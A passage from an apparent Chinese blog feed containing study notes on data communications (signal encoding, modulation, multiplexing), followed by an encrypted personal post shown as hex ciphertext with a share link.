element）：数字信号的最小单元</p></li></ul><p>数据元素为我们需要发送的数据，信号元素则为我们实际发送的信号，<strong>比率r</strong>为<strong>每个信号元素所承载的数据元素的数量</strong></p><p>由以上两个概念有如下定义：</p><ul><li><strong>数据速率</strong>（data rate）：1 秒内发送的数据元素（位）的数量（也就是<strong>比特率</strong>），单位为 bps</li><li><strong>信号速率</strong>（signal rate）：1 秒内发送的信号元素的数量，单位为<strong>波特</strong>（baud），即<strong>波特率</strong></li></ul><blockquote><p>这里注意 baud 本身就包含“每秒”的含义在内，故不存在“波特每秒”的说法</p></blockquote><p>设 <em>N</em> 为数据速率，<em>c</em> 为情形因子，<em>S</em> 为信号速率，数据速率与信号速率的关系如下：<br>$$<br>S &#x3D; c × N × \frac{1}{r}baud<br>$$<br>最小带宽的计算公式如下：<br>$$<br>B_{min} &#x3D; c × N × \frac{1}{r}<br>$$<br>若通道带宽恒定为 B ，则最大数据速率为：<br>$$<br>N_{max} &#x3D; \frac{1}{c} × B × r<br>$$<br><strong>基线</strong>即为接收方计算接收到信号功率的运行平均值，对于一长串的 0 或 1 的接受很容易引起基线的偏移，称为<strong>基线偏移</strong>（baseline wandering）</p><p>当数字信号中电平保持一段时间的恒定时，频谱会产生接近 0 的低频，称之为<strong>直流成分</strong></p><p><strong>自同步</strong>（self-synchronization）信号在数据中包含有定时信息，以实现双方时钟同步</p><h4 id="编码方案"><a href="#编码方案" class="headerlink" title="编码方案"></a>编码方案</h4><p><img src="https://i.loli.net/2021/10/10/AXvGWmOlxhowsqR.png" alt="image.png"></p><h5 id="单极编码方案（Unipolar）"><a href="#单极编码方案（Unipolar）" class="headerlink" title="单极编码方案（Unipolar）"></a>单极编码方案（Unipolar）</h5><p>即所有信号电平都在时间轴的一边（时间轴上方或下方）</p><ul><li><strong>不归零</strong>（<strong>Non-Return-to-Zero, NRZ</strong>）方案：正电平定义为 1 而负电平定义为 0，在位中间信号不会回到0，有着 <em><code>N/2 Bd</code></em> 的平均信号速率</li></ul><h5 id="极性编码方案（Polar）"><a href="#极性编码方案（Polar）" class="headerlink" title="极性编码方案（Polar）"></a>极性编码方案（Polar）</h5><p>即信号电平分布在时间轴的两边</p><blockquote><p>例如 0 的电平为正数而 1 的电平为负数</p></blockquote><ul><li><p><strong>不归零</strong>（<strong>Non-Return-to-Zero, NRZ</strong>）方案：</p><ul><li><strong>NRZ-L</strong>（<strong>NRZ电平编码，即 NRZ-Level</strong>）：即由信号电平决定位值</li><li><strong>NRZ-I</strong>（<strong>NRZ反相编码，即 NRZ-Invert</strong>）：信号电平是否反转决定位值（下一个位电平未反转为0，反转了就是1）</li></ul><p>这两种方案都有着 <em><code>N/2 Bd</code></em> 的平均信号速率，且都存在基线偏移、同步问题、直流成分问题</p><p><img src="https://i.loli.net/2021/10/11/Y1DXC2Jc5SQAzZ8.png" alt="image.png"></p></li><li><p><strong>归零编码</strong>（<strong>Return-to-Zeron，RZ</strong>）：信号在位中间变化，在每个位中间信号变为0，由两个信号编码一个位</p></li></ul><p><img src="https://i.loli.net/2021/10/11/iVKm2AzTeaB85n1.png" alt="image.png"></p><ul><li><p><strong>双相编码</strong>（<strong>biphase</strong>）：</p><ul><li><strong>曼彻斯特编码方案</strong>：两个电平编码一个位（例如【负-正】为1，【正-负】为0）</li><li><strong>差分曼彻斯特编码方案</strong>：类似于曼彻斯特编码，不过由跳变决定位值（下一个信号的第一个电平未跳变为1，跳变为0)</li></ul><p>这两种编码方案中间的跳变用以同步，也不存在基线偏移与直流成分的问题，有着 <em><code>N Bd</code></em> 的平均信号速率</p><p><img src="https://i.loli.net/2021/10/11/w9kZh3CxKt8DmcU.png" alt="image.png"></p></li></ul><h5 id="双极性方案（bipolar）"><a href="#双极性方案（bipolar）" class="headerlink" title="双极性方案（bipolar）"></a>双极性方案（bipolar）</h5><p>又称多电平二进制，其中一个数据元素的电平固定为0，另一个则在正负值间交替。</p><ul><li><p><strong>AMI</strong>（alternate mark inversion）：中值0电平表示0，1由交替正负电平表示</p></li><li><p><strong>伪三元编码</strong>：AMI的变形，中值0电平表示1，0由交替正负电平表示</p></li></ul><p>  双极性方案没有直流成分，有着 <em><code>N/2 Bd</code></em> 的平均信号速率，通常用于长距离通信，但<strong>当数据中存在0的长序列时就会有同步问题</strong></p><p>  <img src="https://i.loli.net/2021/10/11/HaMg9Pu4kozdcrI.png" alt="image.png"></p><h5 id="多电平方案（multilevel）"><a href="#多电平方案（multilevel）" class="headerlink" title="*多电平方案（multilevel）"></a>*多电平方案（multilevel）</h5><p>由多个电平表示多个数据元素-&gt;mBnL：有L个电平模式，由n个信号表示m（长度）B（二进制数据）数据</p><h5 id="多线路传输（multitransition）"><a href="#多线路传输（multitransition）" class="headerlink" title="*多线路传输（multitransition）"></a>*多线路传输（multitransition）</h5><p>比较典型的就是MLT-3</p><h4 id="块编码（block-coding）"><a href="#块编码（block-coding）" class="headerlink" title="*块编码（block coding）"></a>*块编码（block coding）</h4><p>即将 <code>m 位/块</code> 的一组块重新分为 <code>n 位/块</code>的一组块，又称为 <code>mB/nB</code> 编码技术</p><p><img src="https://i.loli.net/2021/10/11/iJwnmoaXgDVWYGQ.png" alt="image.png"></p><h3 id="4-2-模拟到数字转换"><a href="#4-2-模拟到数字转换" class="headerlink" title="4.2 模拟到数字转换"></a>4.2 模拟到数字转换</h3><h4 id="脉冲码调制（Pulse-Code-Modulation-PCM）"><a href="#脉冲码调制（Pulse-Code-Modulation-PCM）" class="headerlink" title="脉冲码调制（Pulse Code Modulation, PCM）"></a>脉冲码调制（Pulse Code Modulation, PCM）</h4><p>将模拟信号转换为数字信号的最通用技术，有如下三个过程：</p><p><img src="https://i.loli.net/2021/10/11/Ep9zod8LD6hcgQK.png" alt="image.png"></p><h5 id="1-采样（sampling）"><a href="#1-采样（sampling）" class="headerlink" title="1.采样（sampling）"></a>1.采样（sampling）</h5><p>又称为<strong>脉冲振幅调制</strong>（pulse amplitude modulation， <strong>PAM</strong>），主要关注两个方面：</p><ul><li><strong>采样率</strong>（sampling rate）：我们每隔 <em><strong>T<sub>s</sub></strong></em> 秒进行一次采样，采样率 _<strong>f<sub>s </sub></strong>_便是<strong>采样间隔的倒数</strong>，又称为采样频率（sampling frequency）</li><li><strong>奈奎斯特采样定理</strong>：为了再生原始模拟信号，<strong>采样速率至少为原始信号最高频率的两倍</strong></li></ul><h5 id="2-量化（quantizing）"><a href="#2-量化（quantizing）" class="headerlink" title="2.量化（quantizing）"></a>2.量化（quantizing）</h5><p>即将信号的连续取值近似为有限多个离散值的过程，如下：</p><ul><li>假定原始模拟信号振幅介于 <em><strong>V<sub>min</sub></strong></em> 和 <em><strong>V<sub>min</sub></strong></em> 之间</li><li>将范围分为 L 个区间，每个区间高度为 Δ</li><li>分配 0 到 L-1 的量化值给每个区间的中点</li><li>样本振幅值近似为量化值</li></ul><h6 id="量化误差"><a href="#量化误差" class="headerlink" title="量化误差"></a>量化误差</h6><p>量化是一个将实际值转为近似值的过程，因此会存在误差，其对信号 SNR<sub>dB</sub> 的影响取决于量化级别 L 或<strong>每个样本位数</strong> n<sub>b</sub></p><h5 id="3-编码（encoding）"><a href="#3-编码（encoding）" class="headerlink" title="3.编码（encoding）"></a>3.编码（encoding）</h5><p>将量化后的离散信号转换为原始信号的过程，编码的比特率可以由如下公式计算：<br>$$<br>比特率 &#x3D; 采样速率 × 每个样本位数<br>$$</p><h3 id="4-3-传输模式"><a href="#4-3-传输模式" class="headerlink" title="4.3 传输模式"></a>4.3 传输模式</h3><h4 id="并行传输（parallel-transmission）"><a href="#并行传输（parallel-transmission）" class="headerlink" title="并行传输（parallel transmission）"></a>并行传输（parallel transmission）</h4><p>使用 n 条通信线路，从而一次可以发送 n 位数据</p><h4 id="串行传输（serial-transmission）"><a href="#串行传输（serial-transmission）" class="headerlink" title="串行传输（serial transmission）"></a>串行传输（serial transmission）</h4><p>只需要 1 条通信线路，一次发发送 1位数据，有三种模式：</p><ul><li><strong>异步传输</strong>（asynchronous transmission）：将位流按字节分组，（在字节级别上）传输过程中不关心信号的时序（每个 bit 仍要同步），在每个字节开始与结尾添加起始位与停止位以提示接收方</li><li><strong>同步传输</strong>（synchronous transmission）：将位流组合为更长的“帧”，一帧包含数个字节，发送方依次发送位流而不含起始位、停止位与间隙</li><li><strong>等时传输</strong>（isochronous transmission）：保证数据以固定速率到达</li></ul><h2 id="Chapter-5-模拟传输"><a href="#Chapter-5-模拟传输" class="headerlink" title="Chapter 5 - 模拟传输"></a>Chapter 5 - 模拟传输</h2><p>数字传输需要低通通道，而我们通常只有带通通道，因此需要将数字数据&#x2F;低通模拟信号转换为带通模拟信号</p><h3 id="5-1-数字到模拟转换"><a href="#5-1-数字到模拟转换" class="headerlink" title="5.1 数字到模拟转换"></a>5.1 数字到模拟转换</h3><p><img src="https://i.loli.net/2021/10/11/oxNdktvlIfn2iMa.png" alt="image.png"></p><h4 id="比特率和波特率"><a href="#比特率和波特率" class="headerlink" title="比特率和波特率"></a>比特率和波特率</h4><p>与数字传输相似，我们同样可以定义比特率与波特率，设比特率为 <em>N</em> ，波特率为 _S_，比率为 _r_，其关系如下：<br>$$<br>S &#x3D; N × \frac{1}{r} baud<br>$$<br>在模拟传输中有 _<strong>r &#x3D; log<sub>2</sub>L</strong>_，其中 <code>L</code> 为信号元素类型，而非电平数，<strong>波特率小于比特率</strong></p><h4 id="幅移键控（amplitude-shift-keying，-ASK）"><a href="#幅移键控（amplitude-shift-keying，-ASK）" class="headerlink" title="幅移键控（amplitude-shift keying， ASK）"></a>幅移键控（amplitude-shift keying， ASK）</h4><p><img src="https://i.loli.net/2021/10/11/9BigYEr1qPxCHZm.png" alt="image.png"></p><p>以基带数字信号控制载波的幅度变化的调制方式称为幅移键控(ASK)，又称数字调幅</p><p>通过改变载波信号的振幅来生成信号元素，<strong>只有振幅变化而频率和相位保持不变</strong></p><h5 id="二进制-ASK（BASK）"><a href="#二进制-ASK（BASK）" class="headerlink" title="二进制 ASK（BASK）"></a>二进制 ASK（BASK）</h5><p>信号元素只使用两个电平称之为二进制幅移键控或开关键控（OOK）</p><h5 id="ASK-带宽"><a href="#ASK-带宽" class="headerlink" title="ASK 带宽"></a>ASK 带宽</h5><p>设信号速率为 _S_，带宽为 <em>B</em> ，取一个因子 <em>d</em> （取决于调制与过滤处理，值在区间 <code>[0,1]</code>），带宽与信号速率的关系如下：<br>$$<br>B &#x3D; (1+d)×S<br>$$<br>这个公式说明所需带宽最小为 S，最大为 2S，载波频率 <em><strong>f<sub>c</sub></strong></em> 位于带宽中间</p><h4 id="频移键控（Frequency-shift-keying，FSK）"><a href="#频移键控（Frequency-shift-keying，FSK）" class="headerlink" title="频移键控（Frequency-shift keying，FSK）"></a>频移键控（Frequency-shift keying，FSK）</h4><p><img src="https://i.loli.net/2021/10/11/kg7T5rdDzsu8lAn.png" alt="image.png"></p><p>以基带数字信号控制载波的频率变化的调制方式称为频移键控，通过改变载波信号的频率来表示数据，信号元素的振幅峰值与相位保持不变</p><h5 id="二进制-FSK（BFSK）"><a href="#二进制-FSK（BFSK）" class="headerlink" title="二进制 FSK（BFSK）"></a>二进制 FSK（BFSK）</h5><p>即使用两个载波频率表示 0 与 1，通常这两个载波频率很高，之间的差很小</p><p>BFSK 的实现方式有：</p><ul><li><strong>相干</strong>：两个信号元素的边界处的相位是连续的</li><li><strong>非相干</strong>：两个信号元素的边界处的相位是非连续的，可以看作两个 ASK</li></ul><h6 id="BFSK-的带宽"><a href="#BFSK-的带宽" class="headerlink" title="BFSK 的带宽"></a>BFSK 的带宽</h6><p>我们可以将 FSK 看做有着自己载波频率的两个 ASK 信号，若两频率差值为 <em><strong>2 Δf</strong></em> ，则 BFSK 要求的带宽为：<br>$$<br>B &#x3D; (1+d)×S + 2 Δf<br>$$</p><h4 id="相移键控（phase-shift-keying，PSK）"><a href="#相移键控（phase-shift-keying，PSK）" class="headerlink" title="相移键控（phase-shift keying，PSK）"></a>相移键控（phase-shift keying，PSK）</h4><p>以基带数字信号控制载波的相位变化的调制方式称为相移键控，通过改变载波的相位来表示两个或多个信号元素，信号元素的峰值振幅与频率保持不变</p><h5 id="二进制-PSK（BPSK）"><a href="#二进制-PSK（BPSK）" class="headerlink" title="二进制 PSK（BPSK）"></a>二进制 PSK（BPSK）</h5><p><img src="https://i.loli.net/2021/10/11/7nhKPUdlq3R5NOc.png" alt="image.png"></p><p>即只有两个信号元素，一个相位为 0° 而另一个为 180°，相比起 ASK 而言更不易受噪声影响，也不似 FSK 一般需要两个载波信号</p><h6 id="BPSK-的带宽"><a href="#BPSK-的带宽" class="headerlink" title="BPSK 的带宽"></a>BPSK 的带宽</h6><p>$$<br>B &#x3D; (1+d)×S<br>$$</p><h5 id="正交-PSK（QPSK）"><a href="#正交-PSK（QPSK）" class="headerlink" title="正交 PSK（QPSK）"></a>正交 PSK（QPSK）</h5><p>使用两个独立的 BPSK 调制：一个为同相的，一个为正交（异相）的</p><h5 id="正交振幅调制"><a href="#正交振幅调制" class="headerlink" title="正交振幅调制"></a>正交振幅调制</h5><p>为 ASK 与 PSK 的结合：<strong>使用两个载波，一个同相而另一个正交，每个载波都使用不同的振幅</strong>，带宽与 ASK 和 PSK 的最小带宽相同</p><h3 id="5-2-模拟信号调制"><a href="#5-2-模拟信号调制" class="headerlink" title="*5.2 模拟信号调制"></a>*5.2 模拟信号调制</h3><p>由于介质的限制因此有的时候我们还需要将模拟信号进行调制，即<strong>模拟到模拟转换</strong>（analog-to-analog conversion），主要有三种方法：</p><ul><li><p>调幅（amplitude modulation，AM）</p></li><li><p>调频（frequency modulation，FM）</p></li><li><p>调相（phase modulation，PM）</p></li></ul><h2 id="Chapter-6-带宽利用"><a href="#Chapter-6-带宽利用" class="headerlink" title="Chapter 6 - 带宽利用"></a>Chapter 6 - 带宽利用</h2><p>为达到相应的目的，有时需要对带宽进行特殊的利用：复用带宽以获得效率、扩频以进行保密与抗干扰</p><h3 id="6-1-复用（multiplexing）"><a href="#6-1-复用（multiplexing）" class="headerlink" title="6.1 复用（multiplexing）"></a>6.1 复用（multiplexing）</h3><p>复用即允许同时通过一条数据链路传输多个信号的一组技术：多条线路的传输流量送到<strong>复用器</strong>（multiplexer，MUX）后被组成一个单独的传输流，在接收端被<strong>分离器</strong>（demultiplexer，DEMUX）接收，分解为原先的独立传输流</p><h4 id="频分复用（frequency-division-multiplexing，-FDM）"><a href="#频分复用（frequency-division-multiplexing，-FDM）" class="headerlink" title="频分复用（frequency-division multiplexing， FDM）"></a>频分复用（frequency-division multiplexing， FDM）</h4><p><img src="https://i.loli.net/2021/10/11/KduOHNaS5oUZwIc.png" alt="image.png"></p><p>在链路带宽大于待传输信号带宽之和时使用：<strong>将不同的信号调制到不同频率的载波上，再将调制后的信号合并为一个复合信号进行传输</strong></p><p>不同信号的通道间会有部分带宽未被使用，作为<strong>防护带宽</strong>进行分隔以防止信号重叠</p><h4 id="波分复用（wave-division-multiplexing，-WDM）"><a href="#波分复用（wave-division-multiplexing，-WDM）" class="headerlink" title="波分复用（wave-division multiplexing， WDM）"></a>波分复用（wave-division multiplexing， WDM）</h4><p>将多个信号调制为不同波长的信号，合并为复合信号进行传输，类似于 FDM</p><blockquote><p>主要用于光缆</p></blockquote><h4 id="时分复用（time-division-multiplexing，TDM）"><a href="#时分复用（time-division-multiplexing，TDM）" class="headerlink" title="时分复用（time-division multiplexing，TDM）"></a>时分复用（time-division multiplexing，TDM）</h4><p>TDM 为数字化的共享过程，共享的是<strong>时间</strong>：<strong>每个连接占用该条链路的一个时间段进行传输</strong></p><h5 id="同步时分复用（synchronous-TDM）"><a href="#同步时分复用（synchronous-TDM）" class="headerlink" title="同步时分复用（synchronous TDM）"></a>同步时分复用（synchronous TDM）</h5><p><img src="https://i.loli.net/2021/10/11/Z2PHGCawpDjOM8i.png" alt="image.png"></p><ul><li>每个输入连接的数据流被划分成<strong>多个单元</strong>（一位、一字节、一个数据块…），每个输入占用一个输入间隙</li><li>每个输入单元成为一个输出单元，占用一个输出间隙</li><li>每个输出单元的持续时间是输入单元持续时间的 <code>1/n</code></li></ul><p>在同步 TDM 中，链路速率为数据速率的 n 倍，比单元持续时间短 n 倍，TDM 通过添加<strong>帧指示位</strong>解决复用器与解复用器间的同步问题</p><p>不同链路输入数据速率可能存在差异，当某一输入端没有数据发送时会出现<strong>空时隙</strong>，解决方案如下：</p><ul><li><strong>多级复用</strong>：多级 TDM</li><li><strong>多时隙分配</strong>：为一条输入线分配多个时隙</li><li><strong>脉冲填充</strong>：为速率较低的线路添加额外的虚位作为脉冲填充</li></ul><h5 id="统计时分复用（statistical-TDM）"><a href="#统计时分复用（statistical-TDM）" class="headerlink" title="统计时分复用（statistical TDM）"></a>统计时分复用（statistical TDM）</h5><p><img src="https://i.loli.net/2021/10/11/krDoZJAMEmi6O5d.png" alt="image.png"></p><p>动态地进行时隙的分配以避免空时隙的出现，提高带宽的效率，与同步 TDM 不同的是其不需要同步位</p><h3 id="6-2-扩频（spread-spectrum，SS）"><a href="#6-2-扩频（spread-spectrum，SS）" class="headerlink" title="6.2 扩频（spread spectrum，SS）"></a>6.2 扩频（spread spectrum，SS）</h3><p><img src="https://i.loli.net/2021/10/11/4wudMCfeF862aqg.png" alt="image.png"></p><p>将传输信号的频谱（spectrum）打散到较其原始带宽更宽的一种通信技术，常用于无线通信领域（LAN 与 WAN）</p><ul><li>对每个站点所需分配带宽比原所需带宽大</li><li>带宽的扩大过程为<strong>与原信号无关的过程</strong>，即在信号由源端生成后才进行扩频</li></ul><h2 id="Chapter-7-传输介质"><a href="#Chapter-7-传输介质" class="headerlink" title="Chapter 7 - 传输介质"></a>Chapter 7 - 传输介质</h2><h2 id="Chapter-8-交换"><a href="#Chapter-8-交换" class="headerlink" title="Chapter 8 - 交换"></a>Chapter 8 - 交换</h2><h2 id="Chapter-9-使用电话网与有线电视网进行数据传输"><a href="#Chapter-9-使用电话网与有线电视网进行数据传输" class="headerlink" title="Chapter 9 - 使用电话网与有线电视网进行数据传输"></a>Chapter 9 - 使用电话网与有线电视网进行数据传输</h2><h1 id="0x03-数据链路层"><a href="#0x03-数据链路层" class="headerlink" title="0x03.数据链路层"></a>0x03.数据链路层</h1><h2 id="Chapter-10-检错与纠错"><a href="#Chapter-10-检错与纠错" class="headerlink" title="Chapter 10 - 检错与纠错"></a>Chapter 10 - 检错与纠错</h2><h2 id="Chapter-11-数据链路控制"><a href="#Chapter-11-数据链路控制" class="headerlink" title="Chapter 11 - 数据链路控制"></a>Chapter 11 - 数据链路控制</h2><h2 id="Chapter-12-多路访问"><a href="#Chapter-12-多路访问" class="headerlink" title="Chapter 12 - 多路访问"></a>Chapter 12 - 多路访问</h2><h2 id="Chapter-13-有线局域网：以太网"><a href="#Chapter-13-有线局域网：以太网" class="headerlink" title="Chapter 13 - 有线局域网：以太网"></a>Chapter 13 - 有线局域网：以太网</h2><h2 id="Chapter-14-无线局域网"><a href="#Chapter-14-无线局域网" class="headerlink" title="Chapter 14 - 无线局域网"></a>Chapter 14 - 无线局域网</h2><h2 id="Chapter-15-连接局域网、主干网和虚拟局域网"><a href="#Chapter-15-连接局域网、主干网和虚拟局域网" class="headerlink" title="Chapter 15 -连接局域网、主干网和虚拟局域网"></a>Chapter 15 -连接局域网、主干网和虚拟局域网</h2><h2 id="Chapter-16-无线WAN：移动电话和卫星网络"><a href="#Chapter-16-无线WAN：移动电话和卫星网络" class="headerlink" title="Chapter 16 - 无线WAN：移动电话和卫星网络"></a>Chapter 16 - 无线WAN：移动电话和卫星网络</h2><h2 id="Chapter-17-广域网SONET-x2F-SDH"><a href="#Chapter-17-广域网SONET-x2F-SDH" class="headerlink" title="Chapter 17 - 广域网SONET&#x2F;SDH"></a>Chapter 17 - 广域网SONET&#x2F;SDH</h2><h2 id="Chapter-18-虚电路网络：帧中继和ATM"><a href="#Chapter-18-虚电路网络：帧中继和ATM" class="headerlink" title="Chapter 18 - 虚电路网络：帧中继和ATM"></a>Chapter 18 - 虚电路网络：帧中继和ATM</h2><h1 id="0x04-网络层"><a href="#0x04-网络层" class="headerlink" title="0x04.网络层"></a>0x04.网络层</h1><h2 id="Chapter-19-逻辑寻址"><a href="#Chapter-19-逻辑寻址" class="headerlink" title="Chapter 19 - 逻辑寻址"></a>Chapter 19 - 逻辑寻址</h2><h2 id="Chapter-20-IP协议"><a href="#Chapter-20-IP协议" class="headerlink" title="Chapter 20 - IP协议"></a>Chapter 20 - IP协议</h2><h2 id="Chapter-21-地址映射、差错报告和多播"><a href="#Chapter-21-地址映射、差错报告和多播" class="headerlink" title="Chapter 21 - 地址映射、差错报告和多播"></a>Chapter 21 - 地址映射、差错报告和多播</h2><h2 id="Chapter-22-传递、转发和路由选择"><a href="#Chapter-22-传递、转发和路由选择" class="headerlink" title="Chapter 22 - 传递、转发和路由选择"></a>Chapter 22 - 传递、转发和路由选择</h2><h1 id="0x05-传输层"><a href="#0x05-传输层" class="headerlink" title="0x05.传输层"></a>0x05.传输层</h1><h2 id="Chapter-23-UDP、TCP和SCTP"><a href="#Chapter-23-UDP、TCP和SCTP" class="headerlink" title="Chapter 23 - UDP、TCP和SCTP"></a>Chapter 23 - UDP、TCP和SCTP</h2><h2 id="Chapter-24-拥塞控制和服务质量"><a href="#Chapter-24-拥塞控制和服务质量" class="headerlink" title="Chapter 24 - 拥塞控制和服务质量"></a>Chapter 24 - 拥塞控制和服务质量</h2><h1 id="0x06-应用层"><a href="#0x06-应用层" class="headerlink" title="0x06.应用层"></a>0x06.应用层</h1><p>这一部分好像都是科普性质，考试应该也不考，可能要摸</p><h2 id="Chapter-25-域名系统"><a href="#Chapter-25-域名系统" class="headerlink" title="Chapter 25 - 域名系统"></a>Chapter 25 - 域名系统</h2><h2 id="Chapter-26-远程登陆、电子邮件与文件传输"><a href="#Chapter-26-远程登陆、电子邮件与文件传输" class="headerlink" title="Chapter 26 - 远程登陆、电子邮件与文件传输"></a>Chapter 26 - 远程登陆、电子邮件与文件传输</h2><h2 id="Chapter-27-万维网与超文本传输协议"><a href="#Chapter-27-万维网与超文本传输协议" class="headerlink" title="Chapter 27 - 万维网与超文本传输协议"></a>Chapter 27 - 万维网与超文本传输协议</h2><h2 id="Chapter-28-网络管理"><a href="#Chapter-28-网络管理" class="headerlink" title="Chapter 28 - 网络管理"></a>Chapter 28 - 网络管理</h2><h2 id="Chapter-29-多媒体"><a href="#Chapter-29-多媒体" class="headerlink" title="Chapter 29 - 多媒体"></a>Chapter 29 - 多媒体</h2><h1 id="0x07-网络安全"><a href="#0x07-网络安全" class="headerlink" title="0x07.网络安全"></a>0x07.网络安全</h1><p>这一部分好像都是科普性质，考试应该也不考，摸了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我爱计网计网爱我&lt;/p&gt;</summary>
    
    
    
    <category term="NETWORK" scheme="http://blog.arttnba3.cn/categories/NETWORK/"/>
    
    
    <category term="计算机网络" scheme="http://blog.arttnba3.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x01】Shell之外的往事：夏天的风</title>
    <link href="http://blog.arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/"/>
    <id>http://blog.arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/</id>
    <published>2021-09-06T21:24:59.000Z</published>
    <updated>2022-08-18T17:45:00.388Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="3e5776f56210393896028edc3afb6f14b7284fbff871de4800b7136399970d0b">eef143a3a3e51e2ee0b1e9c84de8c53c5af9a8774c5ccd7761c7ce1da7021303af3a5f4afe1182ef44b9570739980a2a177218976c11dc3e94ea28b1308ea85f4bc67c79fca9c560933e43208f8300d905efc0b3c96eae5c2e2af117daad2b2c6caa290fc707787fd3197b4b872654aaa8d62f0ec0ee1aed8ed9cb702191a2f643d659bd2b6e4ce9402f0083fb2edee066b597a437c3baf23ee3b85553393839dee2c020ba0f1ff602a06dc926031b0ae94c8bde3b4fbfff6a22b7f43bc599113cb8e71096273c7c89e72d23d5c8fd278e77945cb90c4472372d27cab14b08691a5ebdbbc5077f3101aa47945ac4d2725b81243c81fb52acf80c6ec5615ad98b146251a879f3d2d2586e3bf740f799fa5b149ecf45161bd532e5de2a86a768ac4aebc7735175aa59511c3ad34f4d8d7dc1127cb4351d9b710ed6be83023c179c3d5c425cdc91f2bb27f6082e8954b258596face167f92a7cf17b19c833cfb6eede2eb2fea6a2fdb01df20111216ad7706c1c1cc0bb87cfc8eb20f662fd6365d48fcd3b32f9b14ed86d4b2f21fd99461deb181c762d2e40358d632f818d7318ff4d9c8b2a5d7a6dde224fe907f580504d8197d50a1609f3abe055bae8c2edbda7c44bc8de9b15647c1f6e5b1be4b4ea69f67b2fcd13372f881f6e1a26450a9514000d96f196a4f40b0cdd528b3d0fa27ab88151a936f7cf848b9a0bcd676d838763a3697b83ed13c575fd718e85d2daa8d1aef1c34317ddad580d1a153a9e8c1a82cc84b475854344b8d2c12eae14bf98bac965ff08ee5915f9f05b664a2dbb4030fca9957798d665a7b7bdcc47deda64c553e036edec1eeec9c6f45736bc846957e5fee0a66ebc19259d2fb679f1aaaf51758ba8f677279daf8c00a57a829539ffa412aeccad4f13823e843ab0ed82c4cf389ad1a2423c14b95788522ce80ec643b3fa54938e9cbad34e4d0efc98a2efdfe38a16dddebef1862508ef13692594bbc8bc74bbef48beda5db50b217b61e555b58a8ce1107e12129ed816df4e204c653bcbbe4164a9a865d2e9e821c26cfbfec88c4692d20beea4ae022d4c5a469e05bf927e8d25f9ecd7386d69cc803deaf6397ed79558c381a9887d1ebcb0bd276195650f7afedbf45094b2406277fc074567bc418440a571080cec35b69f23c87625cadb0250d90cf08d329f71fa48fc5e7a4f877a642eee4e659235ecc10f9987764c2325fbe8249a435ceb00a5ce25ea601ecc9f320f419474aa2bcdc30a5358c64641783cda701ca08f5e3f75df3e4678aff581feae2ee722a2a92c176bfdb3fc826c1a25956f8382bcd9a02c52453aefa93c0ca4ae304b4f9172fed07f938417206e3ca118fe68dd377525b4565b5f106f6939f224964e44d1f0a538b18116f13157007bb05db1d9aee1c8a45a3427fefd03eba4f75c0ed16e5c447bc455a776b40811e59ad6e9fafea176ad08870102198f8b21f2f48d36f88efdcac391c4b19df2fd74c06f7cd91cd7bcbe0e5786e340a79e3bd985db4acaae999bc6190379111931a0428b21a6f8eb2c84367d0cf4d2ff7880c9acfdd9289ff4985b96e12c55b299af31a0abc024cc4403c7ee706772176384dc7768c7df6bd5540bd5d11745359c19670023e11e2d28d6fe48f7a2a38df475bd8b38a07c25f65a2dd534ab7e512000e1b8ab3fd6c076bfd020ea093abe05d35d7224cc188d4028e151df8435db8e0c204c5196b0af73e7c163ac468429fadaca02d2bd9d9f50ce491a92d356ff8c794fbdddae1b939dd61a609f390cb95e59ae0cc129b6d11284ce4a8d6e1bd06f99cd4a6bb076755282bfb26d31667b867d5d74605d298f8813fe5bd997a95f34d975844dd0a77c72f46b35725ca6115dca702e014f2fc1c1838f417dae802e2369bdc6b4c860fe7b4e670da0724ad985f5da748421151b7e55f3828298eb30a46dce2a10ffc2cd744361d678d1bcc5ab07b5844931e20c5f28590ec28e9c44b8aa58219b62d041ab54e402072377c28eb880c3e76caff37c5e77d3e7be0b4e0c51493ab28477ebab6e68f24a372e76fe65ec8e87a3f9f823f2227eb5caae487d4e4b6e928ccee144e5b3b4eaab54665f51a2418ef9731983382d9e9f2cda9544ffa8e97cfee324bd3b1a4d12a39d9ca515b7d6704898ed768ac6cefd6c021caf7581db38ea8c9b16d5d8b159db59a78d6574c4b48f5daf7424e9b211c189110b20e79a1a5ac768de7fb8c4732fe81b45c71ec9b0a098cbd66e60549810385d71bd291bb4f0881d7a00b1ef8d350d5346d38f05eb4c3a4470e975cba9065b62a8c2102c731d149507946d39e8df6d817559159afc2a707f4586c63430f9ee65f215db8fdda0f8522922498e6a329eb8c0a4150510a38de7f8f0624752c84c3ba18bf6796fd4759ca22452d8b8d88ffa4854788b18580081600568777868786ffbdfc261da7c3edd340b0598151d295e244dfb31fb0ed5a67c30ce9494dd67379c614dddadb2cd94e9ab99ba841485df401693702abe90cd9fef29cef76739dfbd03c8e7e81756e0e05966a5956627a37f9aa858ea521bd17900c6de469a2339140913db907b9ad70d704a32bd79561230e193905e0fa9a4a4308ef09751be8079b933420dffb5965ccdd02b04d58ac59c22723d94deb0fd5635b06261afe5ade88a234064a2dda976188776378003e105d93c60de71f777f6165678e762a2fca67b71d32839fa52404f114509ed34e37896292dc9be5bff52ed455c8965d3996512c613dfa738953ac18a0ee11838ad9e18749ae687c426b3b7d2e4eac8fcd5a9a6c16b1fe5ef0d912a6c101ecd9c98113b578e60a8bd6a32524bda395ebb1e2a4557f4ea104d018a0a4d7e43a0008dafc4ed7e40c319f0a27314a3419177a507cee95684ba339b406e157270af816a7733ff904c8fae9d6d78ab51a1df17d26a24bd65badf7f735e6006e11022b7f73ac1297effd9ba8028153059e9ddc97c2e1511878bbd5ea2e69ea24d287840c1d9c0005a0a2e9bf197e9b2b6fb65880000b6c593371d63e0bc5c353442be5403a879f79cd0e0423577864b266eecd9b580b92409e7c8c9d59d7df43742eabd359e11ca687ff9cab3c94093d55de970a4046f6e3192e92b53cf2aa9f777605a5103ca1b2528b782ea52180275c216081bd1b463accd0dde7dc30c5d3c118ddb051f5483564f6afb76ae